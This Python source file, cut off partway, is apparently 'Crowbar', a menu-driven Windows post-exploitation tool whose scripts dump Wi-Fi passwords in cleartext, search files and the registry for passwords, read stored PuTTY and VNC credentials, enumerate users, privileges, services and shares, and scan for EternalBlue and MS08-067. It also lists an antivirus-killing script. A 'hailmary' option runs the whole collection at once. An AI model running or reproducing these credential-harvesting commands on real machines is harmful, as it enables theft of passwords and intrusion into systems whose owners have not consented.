# Crowbar
# 4/15/2021
# Made by https://github.com/0x1CA3

import os
import ctypes
import datetime
import shutil
import pyautogui
import winreg
import socket
import platform
import psutil
import requests
import subprocess
import pyautogui
from datetime import datetime
from getmac import get_mac_address

os.system("cls")

ctypes.windll.kernel32.SetConsoleTitleW("[Crowbar Framework]")
beginmen = socket.gethostname()

ipurl = requests.get("https://ipv4bot.whatismyipaddress.com/").text
iptrack = requests.get("https://vpnapi.io/api/").text

# registry scanners from the old crowbar i made

def reg():
	access_reg = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)

	regkey = winreg.OpenKey(access_reg, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")

	for n in range(20):
		try:
			x = winreg.EnumValue(regkey, n)
			print(x)
		except:
			break


def reg1():
	access_reg = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)

	regkey = winreg.OpenKey(access_reg, r"Environment")

	for n in range(20):
		try:
			x = winreg.EnumValue(regkey, n)
			print(x)
		except:
			break

def reg2():
	access_reg = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)

	regkey = winreg.OpenKey(access_reg, r"Volatile Environment")

	for n in range(20):
		try:
			x = winreg.EnumValue(regkey, n)
			print(x)
		except:
			break


def reg3():
	access_reg = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)

	regkey = winreg.OpenKey(access_reg, r"HARDWARE\DESCRIPTION\SYSTEM")

	for n in range(20):
		try:
			x = winreg.EnumValue(regkey, n)
			print(x)
		except:
			break


def reg4():
	access_reg = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)

	regkey = winreg.OpenKey(access_reg, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform")

	for n in range(20):
		try:
			x = winreg.EnumValue(regkey, n)
			print(x)
		except:
			break


machine1 = platform.machine()
version1 = platform.version()
platform1 = platform.platform()
uname1 = platform.uname()
system1 = platform.system()
process1 = platform.processor()
computername = socket.gethostname()
localipaddress = socket.gethostbyname(computername)
boottime = datetime.fromtimestamp(psutil.boot_time())


def leavescripts():
    scripts()

# credit to https://github.com/d4vinci for some of the powershell scripts

def scripts():
    print(''' 
    +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
    | If a script by any chance happens to not work or you get no results, it's either because the target doesn't have what the script is        |
    | trying to search for [Example: VNC Passwords from the registry] or the target doesn't have/meet the requirements.                          |
    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+     
    ''')
    while True:
        scripts = input("\nScripts (scripts/)\n  |==> ")
        if scripts == "help":
            print(''' 
            +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
            | help - Prints out help commands.                                                                                                           |
            | list - Lists all the scripts.                                                                                                              |
            | use (script number) - Selects and loads specified utility. Example: use 1                                                                  |
            | hailmary - Runs all scripts against the target. [Not Recommended]                                                                          |
            | clear - Clears the screen.                                                                                                                 |
            | back - Goes back to the Crowbar menu.                                                                                                      |
            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+            
            ''')
        elif scripts == "list":
            print(''' 
            +———— Scripts ——————————————————————————————————————————————————————————————————— Description ————————————————————————————————————————————————————+
            | 1.  scripts/net/grabwifi                                                        A script that dumps the Wi-Fi SSID.                             |
            | 2.  scripts/sysdump                                                             A script that dumps basic system information.                   |
            | 3.  scripts/regdump                                                             A script that dumps information from the registry.              |
            | 4.  scripts/AVKILL                                                              Script that attempts to kill the targets AntiVirus.             |
            | 5.  scripts/net/dumpwifipass                                                    Script that dumps Wi-Fi passwords.                              |
            | 6.  scripts/vuln/eternal_blue [Nmap must be installed on target computer]       Checks if target machine is vulnerable to "Eternal Blue".       |  
            | 7.  scripts/vuln/netapi [Nmap must be installed on target computer]             Checks if target machine is vulnerable to "MS08-067". [Netapi]  |
            | 8.  scripts/getusers                                                            Gets all users registered on the target machine.                |
            | 9.  scripts/cmd/read_firewall_config                                            Gathers firewall information.                                   |
            | 10. scripts/cmd/read_registry_putty_sessions                                    Gather information and passwords from putty sessions.           |
            | 11. scripts/cmd/search_for_passwords                                            Searches for passwords on the target machine.                   |
            | 12. scripts/cmd/search_registry_for_passwords_cu                                Searches registry for passwords.                                |
            | 13. scripts/cmd/read_registry_vnc_passwords                                     Searches the registry for VNC passwords.                        |  
            | 14. scripts/cmd/read_registry_snmp_key                                          Query machine snmp key in the registry to get snmp parameters.  |
            | 15. scripts/cmd/read_registry_run_key                                           Query the run key for the current user on the target machine.   |                                                                                                
            | 16. scripts/cmd/list_network_shares                                             Lists all network shares.                                       |
            | 17. scripts/cmd/list_localgroups                                                Lists the local groups.                                         |
            | 18. scripts/cmd/list_drives                                                     List all drives.                                                |
            | 19. scripts/cmd/get_snmp_config                                                 Fetches current SNMP Configuration.                             |
            | 20. scripts/cmd/list_user_privileges                                            Lists current user privileges.                                  |
            | 21. scripts/cmd/read_services                                                   Reads services with wmic.                                       |
            | 22. scripts/cmd/list_installed_updates                                          Lists installed updates.                                        |
            | 23. scripts/powershell/list_unqouted_services                                   Querying wmi to search for unquoted service paths.              |
            | 24. scripts/powershell/list_routing_tables                                      Lists current routing table.                                    |
            | 25. scripts/powershell/list_network_interfaces                                  Lists network interface.                                        |                                                                 
            | 26. scripts/powershell/list_installed_programs_using_registry                   Lists installed programs using the registry.                    |                                                                                                    
            | 27. scripts/powershell/list_installed_programs_using_folders                    Lists installed programs using folders.                         |                                                                                              
            | 28. scripts/powershell/list_arp_tables                                          Lists ARP tables.                                               |
            | 29. scripts/powershell/get_iis_config                                           Fetches IIS config.                                             |
            | 30. scripts/powershell/sensitive_data_search                                    A script that searches for files with sensitive data.           |                                                             
            +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
            ''')
        elif scripts == "clear":
            os.system("cls")
        elif scripts == "hailmary":
            os.system("Netsh WLAN show profiles")
            print(f''' 
            +——— Basic System Information ———————————————————————————————————————————————————————————————————————————————————————————————————————————————+
            | Machine: {machine1}                                                                                                                             |
            | Version: {version1}                                                                                                                        |
            | Platform: {platform1}                                                                                                        |
            | System: {system1}                                                                                                                            |
            | Computer Name: {computername}                                                                                                             |
            | Local IP: {localipaddress}                                                                                                                     |
            | Last Boot Time: {boottime}                                                                                                 |
            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
            ''')
            print(''' 
            Information from SOFTWARE\Microsoft\Windows NT\CurrentVersion
            ———————————————————————————————————————————————————————————————''')
            reg()
            print(''' 
            Information from \Environment
            ———————————————————————————————————————————————————————————————''')
            reg1()
            print(''' 
            Information from HKEY_CURRENT_USER\Volatile Environment
            ———————————————————————————————————————————————————————————————''')
            reg2()
            print(''' 
            Information from HARDWARE\DESCRIPTION\SYSTEM
            ———————————————————————————————————————————————————————————————''')
            reg3()
            print(''' 
            Information from SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform
            ———————————————————————————————————————————————————————————————''')
            reg4()
            os.system("nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 {}".format(localipaddress))   
            os.system("nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 {}".format(localipaddress))  
            os.system("NET users")
            os.system("netsh firewall show state & netsh firewall show config")   
            os.system("reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'")    
            os.system("findstr /si password *.xml *.ini *.txt *.config")    
            os.system('''REG QUERY HKCU /F "password" /t REG_SZ /S /K''')
            os.system('''reg query "HKCU\Software\ORL\WinVNC3\Password"''')
            os.system('''reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"''')
            os.system("reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run")
            os.system("net share")
            os.system("net localgroup")
            os.system("wmic logicaldisk get caption,description,providername")
            os.system("reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s")
            os.system("whoami /priv")
            os.system("wmic service list brief")
            os.system("wmic qfe")
            subprocess.call('''powershell.exe Get-Content scripts/unquoteservice.ps1 | PowerShell.exe -noprofile -''', shell=True)
            subprocess.call('''powershell.exe Get-Content scripts/routingtable.ps1 | PowerShell.exe -noprofile -''', shell=True)
            subprocess.call('''powershell.exe Get-Content scripts/listnetworkinter.ps1 | PowerShell.exe -noprofile -''', shell=True)
            subprocess.call('''powershell.exe Get-Content scripts/listprogramsreg.ps1 | PowerShell.exe -noprofile -''', shell=True)
            subprocess.call('''powershell.exe Get-Content scripts/listprogramsfol.ps1 | PowerShell.exe -noprofile -''', shell=True)
            subprocess.call('''powershell.exe Get-Content scripts/listarptables.ps1 | PowerShell.exe -noprofile -''', shell=True)
            subprocess.call('''powershell.exe Get-Content scripts/iisconfig.ps1 | PowerShell.exe -noprofile -''', shell=True)
            subprocess.call('''powershell.exe Get-Content scripts/sensitive_data_search.ps1 | PowerShell.exe -noprofile -''', shell=True)
            print(''' 
            +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
            | Hail mary finished!                                                                                                                        |
            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
            ''')
        elif scripts == "back":
            os.system("py main.py")
        elif scripts == "use 1":
            while True:
                scriptsgrabwifi = input("\nScripts (scripts/net/grabwifi)\n  |==> ")
                if scriptsgrabwifi == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | dump - Dumps all Wi-Fi SSID's.                                                                                                             |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                
                    ''')
                elif scriptsgrabwifi == "dump":
                    os.system("Netsh WLAN show profiles")
                elif scriptsgrabwifi == "clear":
                    os.system("cls")
                elif scriptsgrabwifi == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 2":
            while True:
                scriptssysdump = input("\nScripts (scripts/sysdump)\n  |==> ")
                if scriptssysdump == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | dump - Dumps basic system information.                                                                                                     |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                         
                    ''')
                elif scriptssysdump == "dump":
                    print(f''' 
                    +——— Basic System Information ———————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | Machine: {machine1}                                                                                                                             |
                    | Version: {version1}                                                                                                                        |
                    | Platform: {platform1}                                                                                                        |
                    | System: {system1}                                                                                                                            |
                    | Computer Name: {computername}                                                                                                             |
                    | Local IP: {localipaddress}                                                                                                                     |
                    | Last Boot Time: {boottime}                                                                                                 |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    ''')
                elif scriptssysdump == "clear":
                    os.system("cls")
                elif scriptssysdump == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 3":
            while True:
                scriptsregdump = input("\nScripts (scripts/regdump)\n  |==> ")
                if scriptsregdump == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | dump - Dumps information from the registry.                                                                                                |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                 
                    ''')
                elif scriptsregdump == "dump":
                    print(''' 
                    Information from SOFTWARE\Microsoft\Windows NT\CurrentVersion
                    ———————————————————————————————————————————————————————————————''')
                    reg()
                    print(''' 
                    Information from \Environment
                    ———————————————————————————————————————————————————————————————''')
                    reg1()
                    print(''' 
                    Information from HKEY_CURRENT_USER\Volatile Environment
                    ———————————————————————————————————————————————————————————————''')
                    reg2()
                    print(''' 
                    Information from HARDWARE\DESCRIPTION\SYSTEM
                    ———————————————————————————————————————————————————————————————''')
                    reg3()
                    print(''' 
                    Information from SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform
                    ———————————————————————————————————————————————————————————————''')
                    reg4()
                elif scriptsregdump == "clear":
                    os.system("cls")
                elif scriptsregdump == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 4":
            print(''' 
            +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
            | For the safety of the machine, this script will not be executed.                                                                           |
            | However, you can access the file in the '/scripts' folder.                                                                                 |
            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                 
            ''')
        elif scripts == "use 5":
            while True:
                scriptswifipass = input("\nScripts (scripts/net/dumpwifipass)\n  |==> ")        
                if scriptswifipass == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | dump - Dumps Wi-Fi password.                                                                                                               |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+       
                    ''')
                elif scriptswifipass == "dump":
                    wifissid = input("\nScripts (Enter the network SSID which you want to dump passwords from)\n  |==> ")
                    os.system("NETSH WLAN SHOW PROFILE {} KEY=CLEAR".format(wifissid))
                elif scriptswifipass == "clear":
                    os.system("cls")
                elif scriptswifipass == "back":
                    leavescripts()
        elif scripts == "use 6":
            while True:
                scriptseternal = input("\nScripts (scripts/vuln/eternal_blue)\n  |==> ")
                if scriptseternal == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | vuln - Checks if the target computer is vulnerable.                                                                                        |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptseternal == "vuln":
                    os.system("nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 {}".format(localipaddress))
                elif scriptseternal == "clear":
                    os.system("cls")
                elif scriptseternal == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 7":
            while True:
                scriptsnetapi = input("\nScripts (scripts/vuln/netapi)\n  |==> ")
                if scriptsnetapi == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | vuln - Checks if the target computer is vulnerable.                                                                                        |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                            
                    ''')
                elif scriptsnetapi == "vuln":
                    os.system("nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 {}".format(localipaddress))
                elif scriptsnetapi == "clear":
                    os.system("cls")
                elif scriptsnetapi == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 8":
            while True:
                scriptsgetuser = input("\nScripts (scripts/cmd/getusers)\n  |==> ")
                if scriptsgetuser == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                             
                    ''')
                elif scriptsgetuser == "run":
                    os.system("NET users")
                elif scriptsgetuser == "clear":
                    os.system("cls")
                elif scriptsgetuser == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 9":
            while True:
                scriptsfirewallcfg = input("\nScripts (scripts/cmd/read_firewall_config)\n  |==> ")
                if scriptsfirewallcfg == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptsfirewallcfg == "run":
                    os.system("netsh firewall show state & netsh firewall show config")
                elif scriptsfirewallcfg == "clear":
                    os.system("cls")
                elif scriptsfirewallcfg == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 10":
            while True:
                scriptsreadregputty = input("\nScripts (scripts/cmd/read_registry_putty_sessions)\n  |==> ")
                if scriptsreadregputty == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
                    ''')
                elif scriptsreadregputty == "run":
                    os.system("reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'")
                elif scriptsreadregputty == "clear":
                    os.system("cls")
                elif scriptsreadregputty == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 11":
            while True:
                scriptssearchpass = input("\nScripts (scripts/cmd/search_for_passwords)\n  |==> ")
                if scriptssearchpass == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptssearchpass == "run":
                    os.system("findstr /si password *.xml *.ini *.txt *.config")
                elif scriptssearchpass == "clear":
                    os.system("cls")
                elif scriptssearchpass == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 12":
            while True:
                scriptsregisterypasswordcu = input("\nScripts (scripts/cmd/search_registry_for_passwords_cu)\n  |==> ")
                if scriptsregisterypasswordcu == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptsregisterypasswordcu == "run":
                    os.system('''REG QUERY HKCU /F "password" /t REG_SZ /S /K''')
                elif scriptsregisterypasswordcu == "clear":
                    os.system("cls")
                elif scriptsregisterypasswordcu == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 13":
            while True:
                scriptsreadvncpass = input("\nScripts (scripts/cmd/read_registry_vnc_passwords)\n  |==> ")
                if scriptsreadvncpass == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                      
                    ''')
                elif scriptsreadvncpass == "run":
                    os.system('''reg query "HKCU\Software\ORL\WinVNC3\Password"''')
                elif scriptsreadvncpass == "clear":
                    os.system("cls")
                elif scriptsreadvncpass == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 14":
            while True:
                scriptssnmpkey = input("\nScripts (scripts/cmd/read_registry_snmp_key)\n  |==> ")
                if scriptssnmpkey == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                         
                    ''')
                elif scriptssnmpkey == "run":
                    os.system('''reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"''')
                elif scriptssnmpkey == "clear":
                    os.system("cls")
                elif scriptssnmpkey == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 15":
            while True:
                scriptsregrunkey = input("\nScripts (scripts/cmd/read_registry_run_key)\n  |==> ")
                if scriptsregrunkey == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptsregrunkey == "run":
                    os.system("reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run")
                elif scriptsregrunkey == "clear":
                    os.system("cls")
                elif scriptsregrunkey == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 16":
            while True:
                scriptsnetshares = input("\nScripts (scripts/cmd/list_network_shares)\n  |==> ")
                if scriptsnetshares == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptsnetshares == "run":
                    os.system("net share")
                elif scriptsnetshares == "clear":
                    os.system("cls")
                elif scriptsnetshares == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 17":
            while True:
                scriptslistlocalgroup = input("\nScripts (scripts/cmd/list_localgroups)\n  |==> ")
                if scriptslistlocalgroup == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptslistlocalgroup == "run":
                    os.system("net localgroup")
                elif scriptslistlocalgroup == "clear":
                    os.system("cls")
                elif scriptslistlocalgroup == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 18":
            while True:
                scriptslistdrive = input("\nScripts (scripts/cmd/list_drives)\n  |==> ")
                if scriptslistdrive == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
                    ''')
                elif scriptslistdrive == "run":
                    os.system("wmic logicaldisk get caption,description,providername")
                elif scriptslistdrive == "clear":
                    os.system("cls")
                elif scriptslistdrive == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 19":
            while True:
                scriptsgetsnmpcfg = input("\nScripts (scripts/cmd/get_snmp_config)\n  |==> ")
                if scriptsgetsnmpcfg == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptsgetsnmpcfg == "run":
                    os.system("reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s")
                elif scriptsgetsnmpcfg == "clear":
                    os.system("cls")
                elif scriptsgetsnmpcfg == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 20":
            while True:
                scriptslistuserpriv = input("\nScripts (scripts/cmd/list_user_privileges)\n  |==> ")
                if scriptslistuserpriv == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                      
                    ''') 
                elif scriptslistuserpriv == "run":
                    os.system("whoami /priv")
                elif scriptslistuserpriv == "clear":
                    os.system("cls")
                elif scriptslistuserpriv == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 21":
            while True:
                scriptsreadservices = input("\nScripts (scripts/cmd/read_services)\n  |==> ")
                if scriptsreadservices == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')   
                elif scriptsreadservices == "run":
                    os.system("wmic service list brief")
                elif scriptsreadservices == "clear":
                    os.system("cls")
                elif scriptsreadservices == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 22":
            while True:
                scriptslistinstalled = input("\nScripts (scripts/cmd/list_installed_updates)\n  |==> ")
                if scriptslistinstalled == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptslistinstalled == "run":
                    os.system("wmic qfe")
                elif scriptslistinstalled == "clear":
                    os.system("cls")
                elif scriptslistinstalled == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 23":
            while True:
                scriptslistunquote = input("\nScripts (scripts/powershell/list_unquoted_services)\n  |==> ")
                if scriptslistunquote == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptslistunquote == "run":
                    subprocess.call('''powershell.exe Get-Content scripts/unquoteservice.ps1 | PowerShell.exe -noprofile -''', shell=True)
                elif scriptslistunquote == "clear":
                    os.system("cls")
                elif scriptslistunquote == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 24":
            while True:
                scriptsroutingtable = input("\nScripts (scripts/powershell/list_routing_tables)\n  |==> ")             
                if scriptsroutingtable == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                      
                    ''')
                elif scriptsroutingtable == "run":
                    subprocess.call('''powershell.exe Get-Content scripts/routingtable.ps1 | PowerShell.exe -noprofile -''', shell=True)
                elif scriptsroutingtable == "clear":
                    os.system("cls")
                elif scriptsroutingtable == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")
        elif scripts == "use 25":
            while True:
                scriptsnetworkinter = input("\nScripts (scripts/powershell/list_network_interfaces)\n  |==> ")
                if scriptsnetworkinter == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                    | help - Prints out help commands.                                                                                                           |
                    | run - Runs the script against the host machine.                                                                                            |
                    | clear - Clears the screen.                                                                                                                 |
                    | back - goes back to the 'Scripts' directory.                                                                                               |
                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                    ''')
                elif scriptsnetworkinter == "run":
                    subprocess.call('''powershell.exe Get-Content scripts/listnetworkinter.ps1 | PowerShell.exe -noprofile -''', shell=True)
                elif scriptsnetworkinter == "clear":
                    os.system("cls")
                elif scriptsnetworkinter == "back":
                    leavescripts()
                else:
                    print("Wrong Command!")    
        elif scripts == "use 26":
            while True:
                scriptslistinstalledproreg = input("\nScripts (scripts/powershell/list_installed_programs_using_registry)\n  |==> ")
                if scriptslistinstalledproreg == "help":
                    print(''' 
                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
